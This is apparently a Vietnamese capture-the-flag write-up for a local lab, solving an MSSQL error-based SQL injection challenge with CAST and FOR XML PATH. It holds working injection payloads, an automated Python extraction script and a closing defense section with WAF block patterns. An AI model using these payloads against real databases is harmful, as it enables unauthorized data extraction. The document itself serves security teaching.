# SQLi-013 Solution: MSSQL FOR XML PATH Error-based

## 📋 Thông Tin Challenge

- **URL:** `http://localhost:5013/api/employee?id=1`
- **Tham số vulnerable:** `id`
- **Kỹ thuật:** MSSQL FOR XML PATH Error-based Injection
- **Target:** Bảng `flags`, cột `value`
- **DBMS:** Microsoft SQL Server

---

## 🔍 BƯỚC 1: Detection - Phát Hiện Lỗi

### 1.1. Test Basic Injection

```
http://localhost:5013/api/employee?id=1'
```

**Kết quả:**

```json
{
  "error": "Unclosed quotation mark after the character string ''."
}
```

✅ **Kết luận:** Có SQL Injection!

### 1.2. Test Comment Syntax

```
http://localhost:5013/api/employee?id=1'--
```

**Kết quả:** Trả về bình thường

✅ **Kết luận:** Đây là MSSQL (sử dụng `--` comment)

### 1.3. Test CAST Error-based

```
http://localhost:5013/api/employee?id=1 AND 1=CAST(@@version AS int)--
```

**URL Encoded:**

```
GET /api/employee?id=1%20AND%201%3dCAST(@@version%20AS%20int)-- HTTP/1.1
```

**Kết quả:**

```json
{
  "error": "Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int."
}
```

✅ **HOẠT ĐỘNG!** Đây là MSSQL Server 2019!

---

## 🎯 BƯỚC 2: Hiểu FOR XML PATH

### 2.1. FOR XML PATH Là Gì?

**FOR XML PATH** là feature của MSSQL để **concatenate multiple rows** thành một string duy nhất.

**Syntax:**

```sql
SELECT column_name FROM table_name FOR XML PATH('')
```

### 2.2. So Sánh: Với và Không Có FOR XML PATH

**Không có FOR XML PATH:**

```sql
SELECT name FROM employees
→ Trả về multiple rows:
  John
  Alice
  Bob
```

**Với FOR XML PATH:**

```sql
SELECT name+',' FROM employees FOR XML PATH('')
→ Trả về single string:
  'John,Alice,Bob,'
```

### 2.3. Tại Sao Cần FOR XML PATH Trong Error-based?

**Vấn đề:** CAST/CONVERT chỉ accept **scalar value** (1 giá trị duy nhất)

```sql
-- ❌ KHÔNG WORK: Subquery returns multiple rows
CAST((SELECT name FROM employees) AS int)

-- ✅ WORK: FOR XML PATH concatenate thành 1 string
CAST((SELECT name+',' FROM employees FOR XML PATH('')) AS int)
```

### 2.4. Demo Hoạt Động

```sql
-- Step 1: Query trả về multiple rows
SELECT name FROM employees
→ John
→ Alice
→ Bob

-- Step 2: FOR XML PATH concatenate
SELECT name+',' FROM employees FOR XML PATH('')
→ 'John,Alice,Bob,'

-- Step 3: CAST trigger error
CAST('John,Alice,Bob,' AS int)
→ ERROR: Conversion failed when converting the nvarchar value 'John,Alice,Bob,' to data type int.
```

✅ **Kết quả:** All data leaked trong một lần!

---

## 🧠 BƯỚC 3: Fingerprint Database

### 3.1. Xác Định Database Name

```
GET /api/employee?id=1 AND 1=CAST(DB_NAME() AS int)-- HTTP/1.1
```

**Kết quả:**

```json
{
  "error": "Conversion failed when converting the nvarchar value 'company_api' to data type int."
}
```

✅ **Database name:** `company_api`

### 3.2. List All Databases

```
GET /api/employee?id=1 AND 1=CAST((SELECT name+',' FROM master..sysdatabases FOR XML PATH('')) AS int)-- HTTP/1.1
```

**Payload breakdown:**

- `master..sysdatabases`: System table chứa danh sách databases
- `name+','`: Nối mỗi database name với dấu phẩy
- `FOR XML PATH('')`: Concatenate tất cả thành 1 string

**Kết quả:**

```json
{
  "error": "Conversion failed when converting the nvarchar value 'master,tempdb,model,msdb,company_api,' to data type int."
}
```

✅ **Databases:**

- `master` (system)
- `tempdb` (system)
- `model` (system)
- `msdb` (system)
- `company_api` (target database)

### 3.3. Get Current User

```
GET /api/employee?id=1 AND 1=CAST(USER_NAME() AS int)-- HTTP/1.1
```

**Kết quả:**

```json
{
  "error": "Conversion failed when converting the nvarchar value 'sa' to data type int."
}
```

✅ **Current user:** `sa` (System Administrator - quyền cao nhất!)

---

## 🔎 BƯỚC 4: Enumerate Tables

### 4.1. List All Tables

```
GET /api/employee?id=1 AND 1=CAST((SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')) AS int)-- HTTP/1.1
```

**Kết quả:**

```json
{
  "error": "Conversion failed when converting the nvarchar value 'employees,flags,' to data type int."
}
```

✅ **Tables found:**

- `employees`
- `flags` ← **Target!**

### 4.2. Alternative: Filter User Tables Only

```sql
-- Filter only user tables (exclude system tables)
1 AND 1=CAST((SELECT name+',' FROM sys.tables WHERE type='U' FOR XML PATH('')) AS int)--
```

**Kết quả tương tự:** `employees,flags,`

### 4.3. Get Table Row Count

```
GET /api/employee?id=1 AND 1=CAST((SELECT CAST(COUNT(*) AS VARCHAR) FROM flags) AS int)-- HTTP/1.1
```

**Kết quả:**

```json
{
  "error": "Conversion failed when converting the nvarchar value '1' to data type int."
}
```

✅ **Table `flags` có 1 row**

---

## 🔐 BƯỚC 5: Enumerate Columns từ Table `flags`

### 5.1. List Columns

```
GET /api/employee?id=1 AND 1=CAST((SELECT column_name+',' FROM information_schema.columns WHERE table_name='flags' FOR XML PATH('')) AS int)-- HTTP/1.1
```

**Kết quả:**

```json
{
  "error": "Conversion failed when converting the nvarchar value 'id,value,' to data type int."
}
```

✅ **Columns in `flags` table:**

- `id`
- `value` ← **Target column!**

### 5.2. Get Column Data Types

```
GET /api/employee?id=1 AND 1=CAST((SELECT column_name+':'+data_type+',' FROM information_schema.columns WHERE table_name='flags' FOR XML PATH('')) AS int)-- HTTP/1.1
```

**Kết quả:**

```json
{
  "error": "Conversion failed when converting the nvarchar value 'id:int,value:nvarchar,' to data type int."
}
```

✅ **Column details:**

- `id`: `int`
- `value`: `nvarchar` (string)

---

## 🚀 BƯỚC 6: Extract Flag

### 6.1. Get All Values from `flags` Table

**Final Payload:**

```
GET /api/employee?id=1 AND 1=CAST((SELECT value FROM flags FOR XML PATH('')) AS int)-- HTTP/1.1
```

**Payload breakdown:**

- `SELECT value FROM flags`: Lấy data từ column `value`
- `FOR XML PATH('')`: Concatenate tất cả rows thành 1 string
- `CAST(... AS int)`: Trigger error với data

**Kết quả:**

```json
{
  "error": "Conversion failed when converting the nvarchar value 'FLAG{xml_p4th_mult1pl3_r0ws}' to data type int."
}
```

✅ **FLAG:** `FLAG{xml_p4th_mult1pl3_r0ws}`

### 6.2. Alternative: Get with Delimiter

Nếu có nhiều rows, dùng delimiter để phân biệt:

```sql
1 AND 1=CAST((SELECT value+'|' FROM flags FOR XML PATH('')) AS int)--
```

**Kết quả nếu có nhiều rows:**

```
FLAG{first_flag}|FLAG{second_flag}|FLAG{third_flag}|
```

### 6.3. Get Specific Row với TOP

```sql
-- Get first row only
1 AND 1=CAST((SELECT TOP 1 value FROM flags) AS int)--

-- Get second row
1 AND 1=CAST((SELECT TOP 1 value FROM flags WHERE value NOT IN (SELECT TOP 1 value FROM flags)) AS int)--
```

---

## 🔧 BƯỚC 7: Automation Script

### 7.1. Python Script

```python
#!/usr/bin/env python3
import requests
import re
import json

BASE_URL = "http://localhost:5013/api/employee"

def extract_error(payload):
    """Extract data from CAST error message"""
    try:
        r = requests.get(BASE_URL, params={"id": payload})
        data = r.json()
        if "error" in data:
            match = re.search(r"converting the nvarchar value '([^']+)'", data["error"])
            return match.group(1) if match else None
    except:
        return None

print("[*] Step 1: Detect MSSQL version")
payload1 = "1 AND 1=CAST(@@version AS int)--"
version = extract_error(payload1)
print(f"[+] Version: {version}\n")

print("[*] Step 2: Get database name")
payload2 = "1 AND 1=CAST(DB_NAME() AS int)--"
db_name = extract_error(payload2)
print(f"[+] Database: {db_name}\n")

print("[*] Step 3: Get current user")
payload3 = "1 AND 1=CAST(USER_NAME() AS int)--"
user = extract_error(payload3)
print(f"[+] Current User: {user}\n")

print("[*] Step 4: List all databases")
payload4 = "1 AND 1=CAST((SELECT name+',' FROM master..sysdatabases FOR XML PATH('')) AS int)--"
databases = extract_error(payload4)
print(f"[+] Databases: {databases}\n")

print("[*] Step 5: Enumerate tables")
payload5 = "1 AND 1=CAST((SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')) AS int)--"
tables = extract_error(payload5)
print(f"[+] Tables: {tables}\n")

print("[*] Step 6: Get columns from 'flags' table")
payload6 = "1 AND 1=CAST((SELECT column_name+',' FROM information_schema.columns WHERE table_name='flags' FOR XML PATH('')) AS int)--"
columns = extract_error(payload6)
print(f"[+] Columns in 'flags': {columns}\n")

print("[*] Step 7: Extract flag")
payload7 = "1 AND 1=CAST((SELECT value FROM flags FOR XML PATH('')) AS int)--"
flag = extract_error(payload7)
print(f"[+] Flag: {flag}")
```

### 7.2. Chạy Script

```bash
python3 exploit.py
```

**Output:**

```
[*] Step 1: Detect MSSQL version
[+] Version: Microsoft SQL Server 2019 (RTM) - 15.0.2000.5

[*] Step 2: Get database name
[+] Database: company_api

[*] Step 3: Get current user
[+] Current User: sa

[*] Step 4: List all databases
[+] Databases: master,tempdb,model,msdb,company_api,

[*] Step 5: Enumerate tables
[+] Tables: employees,flags,

[*] Step 6: Get columns from 'flags' table
[+] Columns in 'flags': id,value,

[*] Step 7: Extract flag
[+] Flag: FLAG{xml_p4th_mult1pl3_r0ws}
```

---

## 📊 BƯỚC 8: Tổng Kết

### 8.1. Complete Exploitation Chain

```
1. Detection:
   1 AND 1=CAST(@@version AS int)--

2. Database Fingerprinting:
   1 AND 1=CAST(DB_NAME() AS int)--

3. List Databases:
   1 AND 1=CAST((SELECT name+',' FROM master..sysdatabases FOR XML PATH('')) AS int)--

4. Table Enumeration:
   1 AND 1=CAST((SELECT table_name+',' FROM information_schema.tables FOR XML PATH('')) AS int)--

5. Column Enumeration:
   1 AND 1=CAST((SELECT column_name+',' FROM information_schema.columns WHERE table_name='flags' FOR XML PATH('')) AS int)--

6. Data Extraction:
   1 AND 1=CAST((SELECT value FROM flags FOR XML PATH('')) AS int)--
```

### 8.2. FOR XML PATH Variants

**Variant 1: Empty PATH (most common)**

```sql
FOR XML PATH('')
→ Output: 'value1value2value3'
```

**Variant 2: Named PATH**

```sql
FOR XML PATH('row')
→ Output: '<row>value1</row><row>value2</row>'
```

**Variant 3: With Delimiter**

```sql
SELECT value+',' FROM table FOR XML PATH('')
→ Output: 'value1,value2,value3,'
```

**Best Practice:** Dùng `FOR XML PATH('')` với delimiter (`,` hoặc `|`) để dễ parse.

### 8.3. So Sánh Các Kỹ Thuật MSSQL

| Technique           | Syntax                            | Use Case                 | Advantage                  |
| ------------------- | --------------------------------- | ------------------------ | -------------------------- |
| **CONVERT**         | `CONVERT(int, data)`              | Single value extraction  | Đơn giản, trực tiếp        |
| **CAST**            | `CAST(data AS int)`               | Single value extraction  | SQL standard               |
| **FOR XML PATH**    | `FOR XML PATH('')`                | Multiple rows extraction | Lấy nhiều rows trong 1 lần |
| **CONVERT+FOR XML** | `CONVERT(int,(SELECT...FOR XML))` | Multiple rows with error | Kết hợp cả 2 ưu điểm       |

### 8.4. Challenge Progression

| Challenge    | DBMS      | Technique              | Key Feature                    |
| ------------ | --------- | ---------------------- | ------------------------------ |
| SQLi-009     | MySQL     | ExtractValue           | XPATH error, 32 char limit     |
| SQLi-010     | MySQL     | UpdateXML              | XPATH error, 32 char limit     |
| SQLi-011     | MySQL     | ExtractValue+SUBSTRING | Multi-part extraction          |
| SQLi-012     | MSSQL     | CONVERT                | Single value, FOR XML PATH     |
| **SQLi-013** | **MSSQL** | **FOR XML PATH**       | **Multiple rows in one error** |

---

## 🎓 BƯỚC 9: Kiến Thức Mở Rộng

### 9.1. FOR XML PATH Advanced Techniques

**Technique 1: Concatenate với Custom Delimiter**

```sql
SELECT name+'|' FROM employees FOR XML PATH('')
→ 'John|Alice|Bob|'
```

**Technique 2: Multiple Columns**

```sql
SELECT name+':'+email+',' FROM employees FOR XML PATH('')
→ 'John:john@example.com,Alice:alice@example.com,'
```

**Technique 3: Conditional Concatenation**

```sql
SELECT
  CASE
    WHEN salary > 50000 THEN name+' (high),'
    ELSE name+' (low),'
  END
FROM employees FOR XML PATH('')
```

**Technique 4: Nested Tables**

```sql
SELECT
  table_name+'['+
  (SELECT column_name+',' FROM information_schema.columns WHERE columns.table_name=tables.table_name FOR XML PATH(''))+
  '],'
FROM information_schema.tables FOR XML PATH('')

→ 'employees[id,name,email,],flags[id,value,],'
```

### 9.2. FOR XML PATH vs STRING_AGG

SQL Server 2017+ có function `STRING_AGG`:

```sql
-- Old way: FOR XML PATH
SELECT name+',' FROM employees FOR XML PATH('')
→ 'John,Alice,Bob,'

-- New way: STRING_AGG (SQL Server 2017+)
SELECT STRING_AGG(name, ',') FROM employees
→ 'John,Alice,Bob'
```

**Trong SQL Injection:** FOR XML PATH vẫn phổ biến hơn vì:

- Work trên mọi version MSSQL
- Dễ combine với CAST/CONVERT

### 9.3. Alternative System Tables

**Enumerate Databases:**

```sql
-- Method 1: master..sysdatabases (old)
SELECT name FROM master..sysdatabases

-- Method 2: sys.databases (new)
SELECT name FROM sys.databases
```

**Enumerate Tables:**

```sql
-- Method 1: information_schema.tables (standard SQL)
SELECT table_name FROM information_schema.tables

-- Method 2: sys.tables (MSSQL specific)
SELECT name FROM sys.tables WHERE type='U'

-- Method 3: sys.objects
SELECT name FROM sys.objects WHERE type='U'
```

**Enumerate Columns:**

```sql
-- Method 1: information_schema.columns
SELECT column_name FROM information_schema.columns WHERE table_name='flags'

-- Method 2: sys.columns + sys.tables
SELECT c.name FROM sys.columns c
JOIN sys.tables t ON c.object_id=t.object_id
WHERE t.name='flags'
```

### 9.4. FOR XML PATH với Special Characters

**Vấn đề:** XML encoding có thể làm thay đổi special characters

```sql
SELECT '<script>' FROM test FOR XML PATH('')
→ '&lt;script&gt;' (XML encoded)
```

**Giải pháp:** Dùng `TYPE` directive để bypass encoding

```sql
SELECT '<script>' FROM test FOR XML PATH(''), TYPE
→ '<script>' (no encoding)
```

**Trong SQL Injection:**

```sql
1 AND 1=CAST((SELECT value FROM flags FOR XML PATH(''), TYPE) AS int)--
```

---

## 🛡️ BƯỚC 10: Defense & Mitigation

### 10.1. Vulnerable Code Pattern

```python
# VULNERABLE
employee_id = request.args.get('id')
query = f"SELECT * FROM employees WHERE id = {employee_id}"
cursor.execute(query)
```

❌ **Vấn đề:**

- String interpolation
- Không parameterized query
- Error messages exposed to client

### 10.2. Secure Code - Parameterized Queries

```python
# SECURE
employee_id = request.args.get('id')
cursor.execute("SELECT * FROM employees WHERE id = ?", (employee_id,))
```

✅ **Lợi ích:**

- Input tự động escaped
- SQL và data tách biệt
- Ngăn chặn SQL Injection hoàn toàn

### 10.3. Error Handling

```python
# VULNERABLE - Expose error details
@app.route('/api/employee')
def get_employee():
    try:
        employee_id = request.args.get('id')
        query = f"SELECT * FROM employees WHERE id = {employee_id}"
        cursor.execute(query)
        return jsonify(cursor.fetchone())
    except Exception as e:
        return jsonify({"error": str(e)}), 500  # ❌ Exposes SQL error

# SECURE - Generic error message
@app.route('/api/employee')
def get_employee():
    try:
        employee_id = request.args.get('id')
        cursor.execute("SELECT * FROM employees WHERE id = ?", (employee_id,))
        result = cursor.fetchone()
        if result:
            return jsonify(result)
        return jsonify({"error": "Employee not found"}), 404
    except Exception as e:
        app.logger.error(f"Database error: {e}")  # Log internally
        return jsonify({"error": "Internal server error"}), 500  # ✅ Generic
```

### 10.4. Additional Security Layers

**1. Input Validation:**

```python
def validate_employee_id(emp_id):
    """Validate employee ID is a positive integer"""
    try:
        emp_id_int = int(emp_id)
        if emp_id_int <= 0:
            raise ValueError("Invalid employee ID")
        return emp_id_int
    except (ValueError, TypeError):
        raise ValueError("Employee ID must be a positive integer")

# Usage
employee_id = validate_employee_id(request.args.get('id'))
```

**2. Least Privilege:**

```sql
-- Create limited user for API
CREATE LOGIN api_user WITH PASSWORD = 'SecureP@ssw0rd!';
CREATE USER api_user FOR LOGIN api_user;

-- Grant only necessary permissions
GRANT SELECT ON employees TO api_user;
-- NO GRANT on information_schema, sys tables, master database
```

**3. Disable Dangerous Features:**

```sql
-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Disable Ad Hoc Distributed Queries
EXEC sp_configure 'Ad Hoc Distributed Queries', 0;
RECONFIGURE;
```

**4. WAF Rules:**

```
Block patterns:
- FOR XML PATH
- information_schema
- sys.tables, sys.columns, sys.databases
- master..sysdatabases
- @@version, DB_NAME(), USER_NAME()
- CAST(...AS int), CONVERT(int,...)
- Multiple SQL keywords in API parameters
```

**5. Rate Limiting:**

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/api/employee')
@limiter.limit("10 per minute")  # Max 10 requests/minute
def get_employee():
    # ... implementation
```

---

## 🎯 Next Steps

**Continue Learning:**

- [SQLi-014: MSSQL Out-of-Band Injection](../../SQLi-014/) (coming soon)
- [SQLi-015: MSSQL Stacked Queries](../../SQLi-015/) (coming soon)

**Practice More FOR XML PATH:**

```sql
-- Get all tables with column count
1 AND 1=CAST((
  SELECT table_name+'('+CAST(COUNT(*) AS VARCHAR)+'),'
  FROM information_schema.columns
  GROUP BY table_name
  FOR XML PATH('')
) AS int)--

-- Get database schema structure
1 AND 1=CAST((
  SELECT table_name+'.'+column_name+':'+data_type+'|'
  FROM information_schema.columns
  FOR XML PATH('')
) AS int)--

-- Extract multiple columns
1 AND 1=CAST((
  SELECT id+':'+value+'|'
  FROM flags
  FOR XML PATH('')
) AS int)--
```

---

## 📚 References

- [Microsoft FOR XML Documentation](https://docs.microsoft.com/en-us/sql/relational-databases/xml/for-xml-sql-server)
- [MSSQL CAST and CONVERT](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

**🏁 Challenge Complete! Flag extracted using MSSQL FOR XML PATH error-based injection technique.**
